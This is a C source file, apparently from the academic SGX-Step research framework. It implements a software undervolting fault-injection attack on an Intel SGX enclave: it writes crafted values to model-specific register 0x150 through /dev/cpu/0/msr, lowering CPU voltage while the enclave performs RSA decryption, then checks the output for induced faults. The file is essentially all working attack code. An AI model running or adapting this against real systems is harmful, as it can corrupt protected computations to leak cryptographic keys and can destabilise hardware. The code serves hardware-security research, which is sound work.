/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <sys/mman.h>
#include <signal.h>
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/pt.h"

#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <inttypes.h>
#include <time.h>
#include <pthread.h>

#define DEBUG_OUTPUT

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("Enclave: %s", str);
}

int64_t my_round(float num)
{
    return num < 0 ? num - 0.5 : num + 0.5;
}

uint64_t wrmsr_value(char* in,uint64_t plane)
{
      int64_t val=strtol(in,NULL,10);
      val=my_round(val*1.024);
      val=0xFFE00000&((val&0xFFF)<<21);
      val=val|0x8000001100000000;
      val=val|(plane<<40);
      return (uint64_t)val;
}


volatile int fault_fired = 0;
uint64_t enclave_base = 0;

// Handle the page fault in thread dummy_page
void fault_handler(int signal)
{
	// Restore memory permissions, this will continue the thread when the fault handler returns
    if(fault_fired == 0)
    {
    }

	fault_fired++;
}

#define RSA_LEN 256

const uint8_t result_exp[RSA_LEN] = {0x2d, 0x3e, 0x35, 0x4d, 0x6d, 0xb7, 0xf1, 0xd2, 0x32, 0xce, 0x81, 0x52, 0x19, 0x75, 0xc2, 0x7b, 0x4f, 0xc1, 0x3a, 0x2f, 0x97, 0xdb, 0x48, 0x04, 0xb4, 0xae, 0x95, 0xd0, 0x87, 0x3e, 0xfb, 0x82, 0xf9, 0x92, 0xe3, 0x1b, 0x59, 0x11, 0x58, 0x43, 0x21, 0x41, 0x02, 0xd5, 0x69, 0x28, 0x8d, 0xb4, 0x9a, 0xd2, 0xaa, 0x2b, 0x36, 0xc1, 0xb7, 0xa1, 0xb4, 0x28, 0x77, 0xf4, 0x4f, 0xfe, 0xdc, 0x4c, 0xdb, 0x2d, 0x9a, 0x83, 0x0e, 0xe1, 0x8a, 0xff, 0xb3, 0xc2, 0xc9, 0x25, 0xfb, 0xdc, 0x3e, 0xf9, 0xaf, 0xf5, 0x26, 0x46, 0xc0, 0xb2, 0xe0, 0xd7, 0x84, 0x1f, 0x25, 0xb4, 0x8b, 0x2e, 0x1b, 0xc3, 0x67, 0x52, 0xf5, 0xa8, 0xee, 0xf1, 0x68, 0x5c, 0x7d, 0xd8, 0xdc, 0x26, 0x0b, 0x31, 0x82, 0xca, 0xe2, 0x45, 0x4b, 0x50, 0x29, 0xe3, 0x50, 0x63, 0x00, 0xe3, 0xe9, 0xac, 0x19, 0x7a, 0xeb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

volatile int flag1 = 0, flag2 = 0;
int fd0 = 0;

uint64_t val_plane0 = 0;
uint64_t val_plane2 = 0;
uint64_t val_zero_plane0 = 0;
uint64_t val_zero_plane2 = 0;
uint64_t tick = 0;

#define TICK_MAX (5347771/3)

void *faulting_thread(void *input)
{
    tick = 0;

    flag2++;
    asm volatile("" ::: "memory"); 

    while(flag1 == 0);
    asm volatile("" ::: "memory"); 

    while(flag1 == 1 && tick < TICK_MAX)
    {
        tick++;
    }
    asm volatile("" ::: "memory"); 

    // voltage back up
    pwrite(fd0,&val_zero_plane0,sizeof val_zero_plane0,0x150);
    pwrite(fd0,&val_zero_plane2,sizeof val_zero_plane2,0x150);

    info("Thread exiting");

    return 0;
}

int main( int argc, char **argv )
{
	sgx_launch_token_t token = {0};
	int retval = 0, i = 0, updated = 0;
    sgx_enclave_id_t eid = 0;
    uint8_t buffer[RSA_LEN] = { 0 };
    fault_fired = 0;
    pthread_t t1;

   	info("Creating enclave...");
	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/ 1,
                                    &token, &updated, &eid, NULL ) );

    // Install PF handler
	// ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

    // Update enclave base buffer
    enclave_base = get_enclave_base();

    int j = 0;
    const char* program = argv[0];

    if (argc != 3)
    {
        printf("Need 2 args: %s iterations offset\n",program);
        exit (-1);
    }

    // Target ecall
    info("init RSA...");

    uint8_t res_var = 0;
    SGX_ASSERT( rsa_init_ecall(eid, &res_var) );

    if(res_var != 1)
    {
        printf("Could not init RSA!\n");
        goto done;
    }

    val_plane0 = wrmsr_value(argv[2],0);
    val_plane2 = wrmsr_value(argv[2],2);

    uint32_t iterations = atoi(argv[1]);
    uint32_t iterations_50k = 50000-iterations;

    val_zero_plane0 = wrmsr_value("0",0);
    val_zero_plane2 = wrmsr_value("0",2);

    fd0 = open("/dev/cpu/0/msr", O_WRONLY);

    if(fd0 == -1)
    {
        printf("Could not open /dev/cpu/0/msr\n");
        return -1;
    }

    // Create thread A
	pthread_create(&t1, NULL, faulting_thread, 0);

    // Wait for thread A to be ready
    while(flag2 == 0) {}

    info("Now computing inside SGX...");

    pwrite(fd0,&val_plane0,sizeof val_plane0,0x150);
    pwrite(fd0,&val_plane2,sizeof val_plane2,0x150);

    // Target ecall
    flag1++;
    asm volatile("" ::: "memory"); 
    SGX_ASSERT( rsa_dec_ecall(eid, &res_var, buffer, iterations) );
    asm volatile("" ::: "memory"); 
    flag1++;

    

    pthread_join(t1, NULL);

    close(fd0);

    info("Done, thread reports %d ticks", tick);

	printf("Result = %x\n", res_var);

    for(i = 0; i < RSA_LEN; i++)
    {
        printf("0x%02x, ", buffer[i]);
    }
    printf("\n");

    if(memcmp(buffer, result_exp, RSA_LEN) != 0)
    {
        printf("Noooo!!!!1111elfoelf\n");
    }
    else
    {
        printf("meh - all fine\n");
    }

    SGX_ASSERT( rsa_clean_ecall(eid, &res_var) );

done:
    SGX_ASSERT( sgx_destroy_enclave(eid) );
    info("Exiting...");
	return 0;
}
